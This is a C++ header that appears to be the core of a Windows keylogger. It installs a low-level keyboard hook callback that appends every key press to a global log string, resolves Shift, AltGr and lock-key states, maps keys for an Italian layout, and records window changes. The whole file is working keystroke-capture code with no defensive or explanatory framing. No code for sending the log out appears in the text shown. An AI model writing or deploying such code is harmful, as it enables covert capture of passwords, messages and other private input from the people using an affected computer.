#pragma once

bool Shift = false;
bool AltGr = false;

bool NumLock = false;
bool Scroll = false;
bool CapsLock = false;

HHOOK keyboard_hook = nullptr;

string log = "";

inline bool isShiftPressed() {
    return GetAsyncKeyState(VK_SHIFT) & 0x8000;
}
inline bool isAltGrPressed() {
    return GetAsyncKeyState(VK_RMENU) & 0x8000;
}
inline bool isNumLockPressed() {
    return GetKeyState(VK_NUMLOCK) & 0x0001;
}
inline bool isScrollPressed() {
    return GetKeyState(VK_SCROLL) & 0x0001;
}
inline bool isCapsLockPressed() {
    return GetKeyState(VK_CAPITAL) & 0x0001;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN))
    {
        CheckWindowChange(log);

        Shift = isShiftPressed();
        AltGr = isAltGrPressed();

        NumLock = isNumLockPressed();
        Scroll = isScrollPressed();
        CapsLock = isCapsLockPressed();

        KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT *)lParam);

        switch (hooked_key.vkCode)
        {
            case 0x14:   log += CapsLock ? "[CAPSLOCK OFF]" : "[CAPSLOCK ON]";       break;
            case 0x90:   log += NumLock ? "[NUMLOCK OFF]" : "[NUMLOCK ON]";          break;
            case 0x91:   log += Scroll ? "[SCROLL LOCK OFF]" : "[SCROLL LOCK ON]";   break;

            case 0x41:   log += CapsLock == Shift ? "a" : "A";                           break;
            case 0x42:   log += CapsLock == Shift ? "b" : "B";                           break;
            case 0x43:   log += CapsLock == Shift ? "c" : "C";                           break;
            case 0x44:   log += CapsLock == Shift ? "d" : "D";                           break;
            case 0x45:   log += !Shift && AltGr ? "€" : CapsLock == Shift ? "e" : "E";   break;
            case 0x46:   log += CapsLock == Shift ? "f" : "F";                           break;
            case 0x47:   log += CapsLock == Shift ? "g" : "G";                           break;
            case 0x48:   log += CapsLock == Shift ? "h" : "H";                           break;
            case 0x49:   log += CapsLock == Shift ? "i" : "I";                           break;
            case 0x4A:   log += CapsLock == Shift ? "j" : "J";                           break;
            case 0x4B:   log += CapsLock == Shift ? "k" : "K";                           break;
            case 0x4C:   log += CapsLock == Shift ? "l" : "L";                           break;
            case 0x4D:   log += CapsLock == Shift ? "m" : "M";                           break;
            case 0x4E:   log += CapsLock == Shift ? "n" : "N";                           break;
            case 0x4F:   log += CapsLock == Shift ? "o" : "O";                           break;
            case 0x50:   log += CapsLock == Shift ? "p" : "P";                           break;
            case 0x51:   log += CapsLock == Shift ? "q" : "Q";                           break;
            case 0x52:   log += CapsLock == Shift ? "r" : "R";                           break;
            case 0x53:   log += CapsLock == Shift ? "s" : "S";                           break;
            case 0x54:   log += CapsLock == Shift ? "t" : "T";                           break;
            case 0x55:   log += CapsLock == Shift ? "u" : "U";                           break;
            case 0x56:   log += CapsLock == Shift ? "v" : "V";                           break;
            case 0x57:   log += CapsLock == Shift ? "w" : "W";                           break;
            case 0x58:   log += CapsLock == Shift ? "x" : "X";                           break;
            case 0x59:   log += CapsLock == Shift ? "y" : "Y";                           break;
            case 0x5A:   log += CapsLock == Shift ? "z" : "Z";                           break;

            case 0x30:   log += Shift ? "=" : "0";                 break;
            case 0x31:   log += Shift ? "!" : "1";                 break;
            case 0x32:   log += Shift ? '"' : '2';                 break;
            case 0x33:   log += Shift ? "£" : "3";                 break;
            case 0x34:   log += Shift ? "$" : "4";                 break;
            case 0x35:   log += Shift ? "%" : AltGr ? "€" : "5";   break;
            case 0x36:   log += Shift ? "&" : "6";                 break;
            case 0x37:   log += Shift ? "/" : "7";                 break;
            case 0x38:   log += Shift ? "(" : "8";                 break;
            case 0x39:   log += Shift ? ")" : "9";                 break;

            case 0x60:   log += "0";   break;
            case 0x61:   log += "1";   break;
            case 0x62:   log += "2";   break;
            case 0x63:   log += "3";   break;
            case 0x64:   log += "4";   break;
            case 0x65:   log += "5";   break;
            case 0x66:   log += "6";   break;
            case 0x67:   log += "7";   break;
            case 0x68:   log += "8";   break;
            case 0x69:   log += "9";   break;
            case 0x6A:   log += "*";   break;
            case 0x6B:   log += "+";   break;
            case 0x6D:   log += "-";   break;
            case 0x6E:   log += ".";   break;
            case 0x6F:   log += "/";   break;

            case 0xBA:   log += Shift ? AltGr ? "{" : "é" : AltGr ? "[" : "è";   break;
            case 0xC0:   log += Shift ? "ç" : AltGr ? "@" : "ò";                 break;
            case 0xDE:   log += Shift ? "°" : AltGr ? "#" : "à";                 break;
            case 0xBF:   log += Shift ? "§" : "ù";                               break;
            case 0xDD:   log += Shift ? "^" : "ì";                               break;

            case 0xBB:   log += Shift ? AltGr ? "}" : "*" : AltGr ? "]" : "+";   break;
            case 0xBC:   log += Shift ? ";" : ",";                               break;
            case 0xBD:   log += Shift ? "_" : "-";                               break;
            case 0xBE:   log += Shift ? ":" : ".";                               break;
            case 0xDB:   log += Shift ? "?" : "'";                               break;
            case 0xDC:   log += Shift ? "|" : "\\";                              break;
            case 0xE2:   log += Shift ? ">" : "<";                               break;

            case 0xA0:   case 0xA1:   log += "[SHIFT]";   break;
            case 0xA2:   case 0xA3:   log += "[CTRL]";    break;
            case 0xA4:   case 0xA5:   log += "[ALT]";     break;
            case 0x5B:   case 0x5C:   log += "[WIN]";     break;

            case 0x70:   log += "[F1]";    break;
            case 0x71:   log += "[F2]";    break;
            case 0x72:   log += "[F3]";    break;
            case 0x73:   log += "[F4]";    break;
            case 0x74:   log += "[F5]";    break;
            case 0x75:   log += "[F6]";    break;
            case 0x76:   log += "[F7]";    break;
            case 0x77:   log += "[F8]";    break;
            case 0x78:   log += "[F9]";    break;
            case 0x79:   log += "[F10]";   break;
            case 0x7A:   log += "[F11]";   break;
            case 0x7B:   log += "[F12]";   break;

            case 0x20:   log += " ";                    break;
            case 0x08:   log += "[BACKSPACE]";          break;
            case 0x09:   log += "[TAB]";                break;
            case 0x0D:   log += "[ENTER]";              break;
            case 0x13:   log += "[PAUSE]";              break;
            case 0x1B:   log += "[ESC]";                break;
            case 0x21:   log += "[PAGE UP]";            break;
            case 0x22:   log += "[PAGE DOWN]";          break;
            case 0x23:   log += "[END]";                break;
            case 0x24:   log += "[HOME]";               break;
            case 0x25:   log += "[LEFT ARROW]";         break;
            case 0x26:   log += "[UP ARROW]";           break;
            case 0x27:   log += "[RIGHT ARROW]";        break;
            case 0x28:   log += "[DOWN ARROW]";         break;
            case 0x29:   log += "[SELECT]";             break;
            case 0x2A:   log += "[PRINT]";              break;
            case 0x2C:   log += "[PRINT SCREEN]";       break;
            case 0x2D:   log += "[INS]";                break;
            case 0x2E:   log += "[DEL]";                break;
            case 0xAD:   log += "[VOLUME MUTE]";        break;
            case 0xAE:   log += "[VOLUME DOWN]";        break;
            case 0xAF:   log += "[VOLUME UP]";          break;
            case 0xB0:   log += "[NEXT TRACK]";         break;
            case 0xB1:   log += "[PREVOUS TRACK]";      break;
            case 0xB2:   log += "[STOP MEDIA]";         break;
            case 0xB3:   log += "[PLAY/PAUSE MEDIA]";   break;

            default:   log += "[UNKNOWN KEY]";   break;
        }
    }

    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}